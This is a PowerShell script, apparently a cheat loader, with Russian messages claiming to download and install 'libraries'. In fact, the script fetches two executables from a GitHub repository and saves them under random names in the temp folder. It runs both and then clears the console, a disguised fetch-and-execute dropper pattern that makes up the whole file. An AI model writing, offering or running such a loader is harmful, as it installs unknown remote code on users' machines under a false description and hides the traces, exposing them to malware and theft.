Clear-Host

Write-Host @'
                                                                                                          
 ▄▄▄▄▄▄▄ ▄▄▄  ▄▄▄ ▄▄▄    ▄▄▄ ▄▄▄    ▄▄▄ ▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄ ▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄   ▄▄▄▄   ▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄ 
███▀▀▀▀▀ ███  ███ ████▄  ███ ████▄  ███ ███   ███ ███▀▀▀▀▀ ███   ███ ███▀▀▀▀▀ ▄██▀▀██▄ ▀▀▀███▀▀▀ █████▀▀▀ 
███▄▄    ███  ███ ███▀██▄███ ███▀██▄███ ▀███▄███▀ ███      █████████ ███▄▄    ███  ███    ███     ▀████▄  
███▀▀    ███▄▄███ ███  ▀████ ███  ▀████   ▀███▀   ███      ███▀▀▀███ ███      ███▀▀███    ███       ▀████ 
███      ▀██████▀ ███    ███ ███    ███    ███    ▀███████ ███   ███ ▀███████ ███  ███    ███    ███████▀
'@ -ForegroundColor Magenta

Write-Host ""
Write-Host "Скачивание библиотек пожалуйста подождите !" -ForegroundColor Yellow

$spinner = '|','/','-','\'

for ($i = 0; $i -lt 20; $i++) {
    $idx = $i % $spinner.Length

    Write-Host "`r $($spinner[$idx])" `
        -NoNewline `
        -ForegroundColor White

    Start-Sleep -Milliseconds 100
}

Write-Host ""
Write-Host "Установка библиотек!" -ForegroundColor Blue

# СИМВОЛЫ ДЛЯ РАНДОМНЫХ ИМЁН
$chars = [char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

# ПЕРВОЕ СЛУЧАЙНОЕ ИМЯ
$randomName1 = -join (1..6 | ForEach-Object {
    $chars | Get-Random
})

# ВТОРОЕ СЛУЧАЙНОЕ ИМЯ
$randomName2 = -join (1..6 | ForEach-Object {
    $chars | Get-Random
})

$temp = $env:TEMP

# ПУТИ К EXE
$lib  = "$temp\$randomName1.exe"
$libs = "$temp\$randomName2.exe"

Write-Host ""
Write-Host "Загрузка файлов..." -ForegroundColor Cyan

# СКАЧИВАНИЕ
Invoke-WebRequest `
    "https://github.com/SuperMod27/0/raw/refs/heads/main/lib.exe" `
    -OutFile $lib

Invoke-WebRequest `
    "https://github.com/SuperMod27/0/raw/refs/heads/main/libs.exe" `
    -OutFile $libs

Write-Host ""
Write-Host "Файлы успешно загружены!" -ForegroundColor Green

Write-Host ""
Write-Host "Запуск установщиков..." -ForegroundColor Cyan

# ЗАПУСК ПЕРВОГО
Start-Process $lib -Wait

Start-Sleep -Seconds 2

# ЗАПУСК ВТОРОГО
Start-Process $libs -Wait

Write-Host ""
Write-Host "Успешно установились все библиотеки" `
    -ForegroundColor Green

Write-Host ""
Write-Host "Окно будет очищено через 5 секунд" `
    -ForegroundColor Yellow

Start-Sleep -Seconds 5

Clear-Host
